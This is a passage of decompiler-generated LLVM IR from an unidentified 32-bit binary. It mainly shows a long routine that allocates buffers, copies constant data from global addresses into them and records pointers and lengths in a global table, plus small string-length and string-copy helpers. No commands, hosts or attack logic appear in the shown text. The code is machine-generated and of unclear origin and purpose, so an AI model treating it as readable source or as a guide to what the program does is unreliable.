  %v0_1299c = load i32, i32* %r6.global-to-local, align 4
  %v1_1299c = trunc i32 %v0_1299c to i8
  store i8 %v1_1299c, i8* bitcast (i32* @global_var_1c3a9.537 to i8*), align 4
  %v1_129a0 = call i32* @malloc(i32 10)
  %v2_129a0 = ptrtoint i32* %v1_129a0 to i32
  store i32 %v2_129a0, i32* %r5.global-to-local, align 4
  %v0_129b0 = load i32, i32* %fp.global-to-local, align 4
  %v1_129b0 = add i32 %v0_129b0, 1
  store i32 %v1_129b0, i32* %fp.global-to-local, align 4
  %v3_129b4 = call i32 @function_12db0(i32 %v2_129a0, i32 ptrtoint (i32* @global_var_13a70.539 to i32), i32 10)
  %v0_129b8 = load i32, i32* %r7.global-to-local, align 4
  %v0_129bc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_129bc, i32* @global_var_1c3ac.540, align 4
  %v1_129c0 = trunc i32 %v1_129b0 to i8
  store i8 %v1_129c0, i8* bitcast (i32* @global_var_1c3b0.541 to i8*), align 4
  %v0_129c4 = load i32, i32* %r6.global-to-local, align 4
  %v1_129c4 = trunc i32 %v0_129c4 to i8
  store i8 %v1_129c4, i8* bitcast (i32* @global_var_1c3b1.542 to i8*), align 4
  %v1_129c8 = call i32* @malloc(i32 %v0_129b8)
  %v3_129c8 = ptrtoint i32* %v1_129c8 to i32
  %v0_129cc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v3_129c8, i32* %r5.global-to-local, align 4
  %v3_129d8 = call i32 @function_12db0(i32 %v3_129c8, i32 ptrtoint (i32* @global_var_13a7c.544 to i32), i32 %v0_129cc)
  %v0_129e0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_129e0, i32* @global_var_1c3b4.545, align 4
  %v0_129e4 = load i32, i32* %r7.global-to-local, align 4
  %v1_129e4 = trunc i32 %v0_129e4 to i8
  store i8 %v1_129e4, i8* bitcast (i32* @global_var_1c3b8.546 to i8*), align 4
  %v0_129e8 = load i32, i32* %r6.global-to-local, align 4
  %v1_129e8 = trunc i32 %v0_129e8 to i8
  store i8 %v1_129e8, i8* bitcast (i32* @global_var_1c3b9.547 to i8*), align 4
  %v1_129ec = call i32* @malloc(i32 16)
  %v3_129ec = ptrtoint i32* %v1_129ec to i32
  store i32 %v3_129ec, i32* %r5.global-to-local, align 4
  %v3_129fc = call i32 @function_12db0(i32 %v3_129ec, i32 ptrtoint (i32* @global_var_13a8c.549 to i32), i32 16)
  store i8 16, i8* bitcast (i32* @global_var_1c3c0.550 to i8*), align 4
  %v0_12a0c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12a0c, i32* @global_var_1c3bc.551, align 4
  %v0_12a10 = load i32, i32* %r6.global-to-local, align 4
  %v1_12a10 = trunc i32 %v0_12a10 to i8
  store i8 %v1_12a10, i8* bitcast (i32* @global_var_1c3c1.552 to i8*), align 4
  %v1_12a14 = call i32* @malloc(i32 19)
  %v3_12a14 = ptrtoint i32* %v1_12a14 to i32
  store i32 %v3_12a14, i32* %r5.global-to-local, align 4
  %v3_12a24 = call i32 @function_12db0(i32 %v3_12a14, i32 ptrtoint (i32* @global_var_13aa0.554 to i32), i32 19)
  %v0_12a2c = load i32, i32* %sb.global-to-local, align 4
  store i8 19, i8* bitcast (i32* @global_var_1c3c8.555 to i8*), align 4
  %v0_12a34 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12a34, i32* @global_var_1c3c4.556, align 4
  %v0_12a38 = load i32, i32* %r6.global-to-local, align 4
  %v1_12a38 = trunc i32 %v0_12a38 to i8
  store i8 %v1_12a38, i8* bitcast (i32* @global_var_1c3c9.557 to i8*), align 4
  %v1_12a3c = call i32* @malloc(i32 %v0_12a2c)
  %v3_12a3c = ptrtoint i32* %v1_12a3c to i32
  %v0_12a44 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v3_12a3c, i32* %r5.global-to-local, align 4
  %v4_12a4c = call i32 @function_12db0(i32 %v3_12a3c, i32 ptrtoint ([9 x i8]* @global_var_13ab4.559 to i32), i32 %v0_12a44)
  %v0_12a50 = load i32, i32* %r8.global-to-local, align 4
  %v0_12a54 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12a54, i32* @global_var_1c3cc.560, align 4
  %v1_12a58 = trunc i32 %v0_12a44 to i8
  store i8 %v1_12a58, i8* bitcast (i32* @global_var_1c3d0.561 to i8*), align 4
  %v0_12a5c = load i32, i32* %r6.global-to-local, align 4
  %v1_12a5c = trunc i32 %v0_12a5c to i8
  store i8 %v1_12a5c, i8* bitcast (i32* @global_var_1c3d1.562 to i8*), align 4
  %v1_12a60 = call i32* @malloc(i32 %v0_12a50)
  %v3_12a60 = ptrtoint i32* %v1_12a60 to i32
  %v0_12a68 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v3_12a60, i32* %r5.global-to-local, align 4
  %v3_12a70 = call i32 @function_12db0(i32 %v3_12a60, i32 ptrtoint (i32* @global_var_13a14.564 to i32), i32 %v0_12a68)
  %v0_12a74 = load i32, i32* %r7.global-to-local, align 4
  %v0_12a78 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12a78, i32* @global_var_1c3d4.565, align 4
  %v1_12a7c = trunc i32 %v0_12a68 to i8
  store i8 %v1_12a7c, i8* bitcast (i32* @global_var_1c3d8.566 to i8*), align 4
  %v0_12a80 = load i32, i32* %r6.global-to-local, align 4
  %v1_12a80 = trunc i32 %v0_12a80 to i8
  store i8 %v1_12a80, i8* bitcast (i32* @global_var_1c3d9.567 to i8*), align 4
  %v1_12a84 = call i32* @malloc(i32 %v0_12a74)
  %v3_12a84 = ptrtoint i32* %v1_12a84 to i32
  %v0_12a88 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v3_12a84, i32* %r5.global-to-local, align 4
  %v3_12a94 = call i32 @function_12db0(i32 %v3_12a84, i32 ptrtoint (i32* @global_var_13ac0.569 to i32), i32 %v0_12a88)
  %v0_12a9c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12a9c, i32* @global_var_1c3dc.570, align 4
  %v0_12aa0 = load i32, i32* %r7.global-to-local, align 4
  %v1_12aa0 = trunc i32 %v0_12aa0 to i8
  store i8 %v1_12aa0, i8* bitcast (i32* @global_var_1c3e0.571 to i8*), align 4
  %v0_12aa4 = load i32, i32* %r6.global-to-local, align 4
  %v1_12aa4 = trunc i32 %v0_12aa4 to i8
  store i8 %v1_12aa4, i8* bitcast (i32* @global_var_1c3e1.572 to i8*), align 4
  %v1_12aa8 = call i32* @malloc(i32 18)
  %v3_12aa8 = ptrtoint i32* %v1_12aa8 to i32
  store i32 %v3_12aa8, i32* %r5.global-to-local, align 4
  %v3_12ab8 = call i32 @function_12db0(i32 %v3_12aa8, i32 ptrtoint (i32* @global_var_13ad0.574 to i32), i32 18)
  store i8 18, i8* bitcast (i32* @global_var_1c3e8.575 to i8*), align 4
  %v0_12ac8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12ac8, i32* @global_var_1c3e4.576, align 4
  %v0_12acc = load i32, i32* %r6.global-to-local, align 4
  %v1_12acc = trunc i32 %v0_12acc to i8
  store i8 %v1_12acc, i8* bitcast (i32* @global_var_1c3e9.577 to i8*), align 4
  %v1_12ad0 = call i32* @malloc(i32 25)
  %v3_12ad0 = ptrtoint i32* %v1_12ad0 to i32
  store i32 %v3_12ad0, i32* %r5.global-to-local, align 4
  %v3_12ae0 = call i32 @function_12db0(i32 %v3_12ad0, i32 ptrtoint (i32* @global_var_13ae4.579 to i32), i32 25)
  store i8 25, i8* bitcast (i32* @global_var_1c3f0.580 to i8*), align 4
  %v0_12af0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12af0, i32* @global_var_1c3ec.581, align 4
  %v0_12af4 = load i32, i32* %r6.global-to-local, align 4
  %v1_12af4 = trunc i32 %v0_12af4 to i8
  store i8 %v1_12af4, i8* bitcast (i32* @global_var_1c3f1.582 to i8*), align 4
  %v1_12af8 = call i32* @malloc(i32 115)
  %v3_12af8 = ptrtoint i32* %v1_12af8 to i32
  store i32 115, i32* %r5.global-to-local, align 4
  store i32 %v3_12af8, i32* %r7.global-to-local, align 4
  %v3_12b0c = call i32 @function_12db0(i32 %v3_12af8, i32 ptrtoint (i32* @global_var_13b00.584 to i32), i32 115)
  %v0_12b10 = load i32, i32* %r5.global-to-local, align 4
  %v0_12b14 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_12b14, i32* @global_var_1c3f4.585, align 4
  %v1_12b18 = trunc i32 %v0_12b10 to i8
  store i8 %v1_12b18, i8* bitcast (i32* @global_var_1c3f8.586 to i8*), align 4
  %v0_12b1c = load i32, i32* %r6.global-to-local, align 4
  %v1_12b1c = trunc i32 %v0_12b1c to i8
  store i8 %v1_12b1c, i8* bitcast (i32* @global_var_1c3f9.587 to i8*), align 4
  %v1_12b20 = call i32* @malloc(i32 %v0_12b10)
  %v3_12b20 = ptrtoint i32* %v1_12b20 to i32
  %v0_12b24 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v3_12b20, i32* %r7.global-to-local, align 4
  %v3_12b30 = call i32 @function_12db0(i32 %v3_12b20, i32 ptrtoint (i32* @global_var_13b74.589 to i32), i32 %v0_12b24)
  %v0_12b38 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_12b38, i32* @global_var_1c3fc.590, align 4
  %v0_12b3c = load i32, i32* %r5.global-to-local, align 4
  %v1_12b3c = trunc i32 %v0_12b3c to i8
  store i8 %v1_12b3c, i8* bitcast (i32* @global_var_1c400.591 to i8*), align 4
  %v0_12b40 = load i32, i32* %r6.global-to-local, align 4
  %v1_12b40 = trunc i32 %v0_12b40 to i8
  store i8 %v1_12b40, i8* bitcast (i32* @global_var_1c401.592 to i8*), align 4
  %v1_12b44 = call i32* @malloc(i32 79)
  %v3_12b44 = ptrtoint i32* %v1_12b44 to i32
  store i32 %v3_12b44, i32* %r5.global-to-local, align 4
  %v3_12b54 = call i32 @function_12db0(i32 %v3_12b44, i32 ptrtoint (i32* @global_var_13be8.594 to i32), i32 79)
  store i8 79, i8* bitcast (i32* @global_var_1c408.595 to i8*), align 4
  %v0_12b64 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12b64, i32* @global_var_1c404.596, align 4
  %v0_12b68 = load i32, i32* %r6.global-to-local, align 4
  %v1_12b68 = trunc i32 %v0_12b68 to i8
  store i8 %v1_12b68, i8* bitcast (i32* @global_var_1c409.597 to i8*), align 4
  %v1_12b6c = call i32* @malloc(i32 114)
  %v3_12b6c = ptrtoint i32* %v1_12b6c to i32
  store i32 114, i32* %r5.global-to-local, align 4
  store i32 %v3_12b6c, i32* %r7.global-to-local, align 4
  %v3_12b80 = call i32 @function_12db0(i32 %v3_12b6c, i32 ptrtoint (i32* @global_var_13c38.599 to i32), i32 114)
  %v0_12b84 = load i32, i32* %r5.global-to-local, align 4
  %v0_12b88 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_12b88, i32* @global_var_1c40c.600, align 4
  %v1_12b8c = trunc i32 %v0_12b84 to i8
  store i8 %v1_12b8c, i8* bitcast (i32* @global_var_1c410.601 to i8*), align 4
  %v0_12b90 = load i32, i32* %r6.global-to-local, align 4
  %v1_12b90 = trunc i32 %v0_12b90 to i8
  store i8 %v1_12b90, i8* bitcast (i32* @global_var_1c411.602 to i8*), align 4
  %v1_12b94 = call i32* @malloc(i32 %v0_12b84)
  %v3_12b94 = ptrtoint i32* %v1_12b94 to i32
  %v0_12b98 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v3_12b94, i32* %r7.global-to-local, align 4
  %v3_12ba4 = call i32 @function_12db0(i32 %v3_12b94, i32 ptrtoint (i32* @global_var_13cac.604 to i32), i32 %v0_12b98)
  %v0_12bac = load i32, i32* %r5.global-to-local, align 4
  %v1_12bac = trunc i32 %v0_12bac to i8
  store i8 %v1_12bac, i8* bitcast (i32* @global_var_1c418.605 to i8*), align 4
  %v0_12bb0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_12bb0, i32* @global_var_1c414.606, align 4
  %v0_12bb4 = load i32, i32* %r6.global-to-local, align 4
  %v1_12bb4 = trunc i32 %v0_12bb4 to i8
  store i8 %v1_12bb4, i8* bitcast (i32* @global_var_1c419.607 to i8*), align 4
  %v1_12bb8 = call i32* @malloc(i32 14)
  %v3_12bb8 = ptrtoint i32* %v1_12bb8 to i32
  store i32 %v3_12bb8, i32* %r5.global-to-local, align 4
  %v3_12bc8 = call i32 @function_12db0(i32 %v3_12bb8, i32 ptrtoint (i32* @global_var_138cc.411 to i32), i32 14)
  store i8 14, i8* bitcast (i32* @global_var_1c420.608 to i8*), align 4
  %v0_12bd8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12bd8, i32* @global_var_1c41c.609, align 4
  %v0_12bdc = load i32, i32* %r6.global-to-local, align 4
  %v1_12bdc = trunc i32 %v0_12bdc to i8
  store i8 %v1_12bdc, i8* bitcast (i32* @global_var_1c421.610 to i8*), align 4
  %v1_12be0 = call i32* @malloc(i32 19)
  %v3_12be0 = ptrtoint i32* %v1_12be0 to i32
  store i32 %v3_12be0, i32* %r5.global-to-local, align 4
  %v3_12bf0 = call i32 @function_12db0(i32 %v3_12be0, i32 ptrtoint (i32* @global_var_138dc.416 to i32), i32 19)
  %v0_12bf8 = load i32, i32* %sl.global-to-local, align 4
  store i8 19, i8* bitcast (i32* @global_var_1c428.611 to i8*), align 4
  %v0_12c00 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12c00, i32* @global_var_1c424.612, align 4
  %v0_12c04 = load i32, i32* %r6.global-to-local, align 4
  %v1_12c04 = trunc i32 %v0_12c04 to i8
  store i8 %v1_12c04, i8* bitcast (i32* @global_var_1c429.613 to i8*), align 4
  %v1_12c08 = call i32* @malloc(i32 %v0_12bf8)
  %v3_12c08 = ptrtoint i32* %v1_12c08 to i32
  %v0_12c10 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v3_12c08, i32* %r5.global-to-local, align 4
  %v3_12c18 = call i32 @function_12db0(i32 %v3_12c08, i32 ptrtoint (i32* @global_var_138a8.401 to i32), i32 %v0_12c10)
  %v0_12c1c = load i32, i32* %fp.global-to-local, align 4
  %v0_12c20 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12c20, i32* @global_var_1c42c.614, align 4
  %v1_12c24 = trunc i32 %v0_12c10 to i8
  store i8 %v1_12c24, i8* bitcast (i32* @global_var_1c430.615 to i8*), align 4
  %v0_12c28 = load i32, i32* %r6.global-to-local, align 4
  %v1_12c28 = trunc i32 %v0_12c28 to i8
  store i8 %v1_12c28, i8* bitcast (i32* @global_var_1c431.616 to i8*), align 4
  %v1_12c2c = call i32* @malloc(i32 %v0_12c1c)
  %v3_12c2c = ptrtoint i32* %v1_12c2c to i32
  %v0_12c34 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v3_12c2c, i32* %r5.global-to-local, align 4
  %v4_12c3c = call i32 @function_12db0(i32 %v3_12c2c, i32 ptrtoint ([11 x i8]* @global_var_13d20.618 to i32), i32 %v0_12c34)
  %v0_12c40 = load i32, i32* %r6.global-to-local, align 4
  %v1_12c40 = trunc i32 %v0_12c40 to i8
  %v2_12c40 = load i32, i32* %r4.global-to-local, align 4
  %v3_12c40 = add i32 %v2_12c40, 501
  %v4_12c40 = inttoptr i32 %v3_12c40 to i8*
  store i8 %v1_12c40, i8* %v4_12c40, align 1
  %v0_12c44 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12c44, i32* @global_var_1c434.619, align 4
  %v0_12c48 = load i32, i32* %fp.global-to-local, align 4
  %v1_12c48 = trunc i32 %v0_12c48 to i8
  store i8 %v1_12c48, i8* bitcast (i32* @global_var_1c438.620 to i8*), align 4
  %v2_12c4c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_12c4c, i32* @r4, align 4
  ret i32 %v4_12c3c

; uselistorder directives
  uselistorder i32 %v3_12c2c, { 1, 0 }
  uselistorder i32 %v3_12c08, { 1, 0 }
  uselistorder i32 %v3_12b94, { 1, 0 }
  uselistorder i32 %v3_12b6c, { 1, 0 }
  uselistorder i32 %v3_12b20, { 1, 0 }
  uselistorder i32 %v3_12af8, { 1, 0 }
  uselistorder i32 %v3_12a84, { 1, 0 }
  uselistorder i32 %v3_12a60, { 1, 0 }
  uselistorder i32 %v3_12a3c, { 1, 0 }
  uselistorder i32 %v3_129c8, { 1, 0 }
  uselistorder i32 %v3_1297c, { 1, 0 }
  uselistorder i32 %v3_12954, { 1, 0 }
  uselistorder i32 %v3_128b8, { 1, 0 }
  uselistorder i32 %v3_12844, { 1, 0 }
  uselistorder i32 %v3_1281c, { 1, 0 }
  uselistorder i32 %v3_127d0, { 1, 0 }
  uselistorder i32 %v3_12784, { 1, 0 }
  uselistorder i32 %v3_12760, { 1, 0 }
  uselistorder i32 %v3_12714, { 1, 0 }
  uselistorder i32 %v3_126c8, { 1, 0 }
  uselistorder i32 %v3_126a4, { 1, 0 }
  uselistorder i32 %v3_12680, { 1, 0 }
  uselistorder i32 %v3_1260c, { 1, 0 }
  uselistorder i32 %v3_12598, { 1, 0 }
  uselistorder i32 %v3_12570, { 1, 0 }
  uselistorder i32 %v3_12520, { 1, 0 }
  uselistorder i32 %v3_124ac, { 1, 0 }
  uselistorder i32 %v3_12484, { 1, 0 }
  uselistorder i32 %v3_1245c, { 1, 0 }
  uselistorder i32 %v3_123bc, { 1, 0 }
  uselistorder i32 %v3_12370, { 1, 0 }
  uselistorder i32 %v2_12340, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 3, 5, 4, 7, 6, 8 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 118, 119, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32 114, { 1, 2, 0 }
  uselistorder i32 79, { 1, 0 }
  uselistorder i32 115, { 1, 2, 0 }
  uselistorder i32 18, { 3, 0, 6, 4, 7, 8, 5, 9, 1, 10, 2, 11 }
  uselistorder i32 12, { 9, 31, 5, 17, 18, 32, 33, 28, 25, 34, 19, 16, 20, 21, 22, 23, 24, 26, 29, 30, 27, 35, 36, 37, 4, 38, 39, 41, 42, 43, 10, 44, 11, 45, 12, 46, 13, 47, 14, 49, 3, 48, 40, 77, 50, 15, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 6, 62, 63, 64, 65, 66, 7, 67, 68, 69, 70, 71, 72, 8, 73, 74, 75, 76, 78, 79, 80, 81, 0, 1, 2, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91 }
  uselistorder i32 83, { 1, 0 }
  uselistorder i32 11, { 0, 1, 8, 9, 10, 11, 4, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 2, 26, 27, 28, 5, 29, 30, 31, 3, 32, 33, 34, 35, 36, 37, 38, 39, 40, 6, 41, 42, 43, 7, 44 }
  uselistorder i8 17, { 1, 0, 2, 3 }
  uselistorder i32 17, { 2, 0, 11, 3, 12, 4, 13, 5, 14, 6, 15, 7, 16, 8, 9, 17, 18, 1, 19, 20, 21, 10, 22, 23, 24, 25, 26 }
  uselistorder i32 21, { 1, 5, 0, 4, 6, 7, 3, 8, 2, 9 }
  uselistorder i32 28, { 3, 2, 4, 8, 5, 9, 6, 10, 11, 12, 13, 14, 15, 16, 17, 0, 7, 19, 18, 20, 21, 22, 23, 24, 25, 26, 1 }
  uselistorder i8 3, { 1, 0 }
  uselistorder i32 23, { 1, 4, 0, 5, 6, 2, 3, 7 }
  uselistorder i32 19, { 5, 1, 6, 2, 7, 3, 8, 4, 0, 10, 11, 9, 12 }
  uselistorder i8 16, { 15, 16, 17, 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i8 6, { 0, 6, 5, 7, 8, 1, 9, 10, 2, 3, 4 }
  uselistorder i32 6, { 12, 33, 2, 13, 32, 0, 34, 14, 35, 1, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 3, 26, 36, 37, 38, 4, 39, 40, 41, 42, 5, 43, 44, 45, 46, 6, 47, 7, 48, 49, 27, 50, 8, 51, 52, 53, 28, 54, 9, 55, 56, 29, 57, 58, 59, 60, 61, 30, 62, 10, 63, 64, 65, 66, 67, 68, 31, 69, 11, 70, 71, 72, 73, 74, 75 }
  uselistorder i32 14, { 6, 0, 7, 1, 8, 2, 9, 3, 13, 10, 14, 11, 15, 12, 16, 17, 4, 18, 19, 20, 21, 5, 22 }
  uselistorder i8 4, { 3, 4, 2, 0, 1 }
  uselistorder i8 5, { 10, 11, 12, 0, 1, 13, 2, 3, 4, 5, 6, 7, 8, 14, 9 }
  uselistorder i32 5, { 27, 14, 4, 15, 5, 2, 16, 26, 3, 0, 17, 28, 18, 19, 20, 21, 22, 23, 29, 30, 31, 32, 6, 33, 34, 35, 36, 7, 37, 38, 39, 40, 41, 42, 43, 44, 8, 45, 46, 24, 47, 9, 48, 49, 50, 10, 51, 52, 53, 54, 11, 55, 56, 57, 58, 59, 60, 61, 12, 62, 63, 64, 65, 66, 67, 68, 13, 69, 70, 71, 1, 72, 73, 25, 74 }
  uselistorder i32 7, { 9, 26, 3, 10, 25, 2, 11, 27, 12, 28, 13, 29, 14, 15, 16, 30, 31, 32, 17, 33, 34, 35, 36, 4, 37, 38, 39, 40, 18, 41, 5, 42, 19, 43, 44, 6, 45, 46, 7, 47, 48, 49, 50, 51, 20, 52, 53, 54, 55, 56, 21, 57, 58, 0, 22, 59, 1, 23, 60, 61, 24, 8, 62 }
  uselistorder i32 29, { 1, 0, 2, 8, 3, 9, 4, 10, 11, 12, 6, 5, 7 }
  uselistorder i32 (i32, i32, i32)* @function_12db0, { 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1c244.323 to i32), { 5, 0, 1, 2, 3, 4 }
  uselistorder i32* (i32)* @malloc, { 28, 58, 15, 18, 47, 12, 61, 2, 31, 52, 46, 19, 57, 30, 24, 23, 55, 22, 21, 35, 34, 0, 33, 1, 25, 26, 4, 3, 17, 5, 6, 7, 45, 14, 20, 27, 16, 53, 8, 32, 11, 13, 54, 29, 9, 51, 41, 43, 56, 62, 10, 60, 37, 39, 42, 38, 36, 44, 48, 63, 49, 40, 59, 50, 64 }
}

define i32 @function_12d34(i8* %arg1) local_unnamed_addr {
dec_label_pc_12d34:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_12d38 = load i8, i8* %arg1, align 1
  %v4_12d38 = zext i8 %v3_12d38 to i32
  %v2_12d3c = icmp eq i8 %v3_12d38, 0
  br i1 %v2_12d3c, label %dec_label_pc_12d58, label %bb

dec_label_pc_12d58:                               ; preds = %dec_label_pc_12d48, %dec_label_pc_12d34
  %merge = phi i32 [ %v4_12d38, %dec_label_pc_12d34 ], [ %v1_12d48, %dec_label_pc_12d48 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_12d34
  br label %dec_label_pc_12d48

dec_label_pc_12d48:                               ; preds = %dec_label_pc_12d48, %bb
  %v0_12d48 = phi i32 [ %v1_12d48, %dec_label_pc_12d48 ], [ 0, %bb ]
  %v1_12d48 = add i32 %v0_12d48, 1
  %v2_12d4c = add i32 %v1_12d48, %tmp
  %v3_12d4c = inttoptr i32 %v2_12d4c to i8*
  %v4_12d4c = load i8, i8* %v3_12d4c, align 1
  %v2_12d50 = icmp eq i8 %v4_12d4c, 0
  br i1 %v2_12d50, label %dec_label_pc_12d58, label %dec_label_pc_12d48

; uselistorder directives
  uselistorder i32 %v1_12d48, { 1, 0, 2 }
}

define i32 @function_12d5c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12d5c:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_12d5c = load i8, i8* %arg1, align 1
  %v3_12d5c = zext i8 %v2_12d5c to i32
  %v2_12d60 = icmp eq i8 %v2_12d5c, 0
  br i1 %v2_12d60, label %dec_label_pc_12da4, label %dec_label_pc_12d68

dec_label_pc_12d68:                               ; preds = %dec_label_pc_12d5c
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12d6c

dec_label_pc_12d6c:                               ; preds = %dec_label_pc_12d6c, %dec_label_pc_12d68
  %v0_12d6c = phi i32 [ %v1_12d6c, %dec_label_pc_12d6c ], [ 0, %dec_label_pc_12d68 ]
  %v1_12d6c = add i32 %v0_12d6c, 1
  store i32 %v1_12d6c, i32* %ip.global-to-local, align 4
  %v2_12d70 = add i32 %v1_12d6c, %tmp
  %v3_12d70 = inttoptr i32 %v2_12d70 to i8*
  %v4_12d70 = load i8, i8* %v3_12d70, align 1
  %v2_12d74 = icmp eq i8 %v4_12d70, 0
  br i1 %v2_12d74, label %dec_label_pc_12d7c, label %dec_label_pc_12d6c

dec_label_pc_12d7c:                               ; preds = %dec_label_pc_12d6c
  %v7_12d7c = icmp eq i32 %v0_12d6c, -2
  br i1 %v7_12d7c, label %dec_label_pc_12d9c, label %dec_label_pc_12d88.preheader

dec_label_pc_12d88.preheader:                     ; preds = %dec_label_pc_12d7c, %dec_label_pc_12da4
  %storemerge = phi i32 [ %v3_12d5c, %dec_label_pc_12da4 ], [ %v1_12d6c, %dec_label_pc_12d7c ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_12d94.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_12d88

dec_label_pc_12d88:                               ; preds = %dec_label_pc_12d88.dec_label_pc_12d88_crit_edge, %dec_label_pc_12d88.preheader
  %v2_12d94 = phi i32 [ %v5_12d94, %dec_label_pc_12d88.dec_label_pc_12d88_crit_edge ], [ %v2_12d94.pre, %dec_label_pc_12d88.preheader ]
  %v0_12d8c = phi i32 [ %v0_12d8c.pre, %dec_label_pc_12d88.dec_label_pc_12d88_crit_edge ], [ %tmp, %dec_label_pc_12d88.preheader ]
  %v0_12d88 = phi i32 [ %v0_12d88.pre, %dec_label_pc_12d88.dec_label_pc_12d88_crit_edge ], [ %storemerge, %dec_label_pc_12d88.preheader ]
  %v1_12d88 = add i32 %v0_12d88, -1
  store i32 %v1_12d88, i32* %r2.global-to-local, align 4
  %v1_12d8c = inttoptr i32 %v0_12d8c to i8*
  %v2_12d8c = load i8, i8* %v1_12d8c, align 1
  %v5_12d8c = add i32 %v0_12d8c, 1
  store i32 %v5_12d8c, i32* %r1.global-to-local, align 4
  %v3_12d90 = icmp eq i32 %v0_12d88, 0
  %v3_12d94 = inttoptr i32 %v2_12d94 to i8*
  store i8 %v2_12d8c, i8* %v3_12d94, align 1
  %v4_12d94 = load i32, i32* @r0, align 4
  %v5_12d94 = add i32 %v4_12d94, 1
  store i32 %v5_12d94, i32* @r0, align 4
  br i1 %v3_12d90, label %dec_label_pc_12d9c.loopexit, label %dec_label_pc_12d88.dec_label_pc_12d88_crit_edge

dec_label_pc_12d88.dec_label_pc_12d88_crit_edge:  ; preds = %dec_label_pc_12d88
  %v0_12d88.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_12d8c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12d88

dec_label_pc_12d9c.loopexit:                      ; preds = %dec_label_pc_12d88
  %v0_12d9c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12d9c

dec_label_pc_12d9c:                               ; preds = %dec_label_pc_12d9c.loopexit, %dec_label_pc_12d7c
  %v0_12d9c = phi i32 [ %v0_12d9c.pre, %dec_label_pc_12d9c.loopexit ], [ %v1_12d6c, %dec_label_pc_12d7c ]
  ret i32 %v0_12d9c

dec_label_pc_12da4:                               ; preds = %dec_label_pc_12d5c
  store i32 %v3_12d5c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12d88.preheader

; uselistorder directives
  uselistorder i32 %v5_12d94, { 1, 0 }
  uselistorder i32 %v0_12d8c, { 1, 0 }
  uselistorder i32 %v1_12d6c, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v3_12d5c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12d88.preheader, { 1, 0 }
}

define i32 @function_12db0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12db0:
  %ip.global-to-local = alloca i32, align 4
  %v2_12db0 = icmp eq i32 %arg3, 0
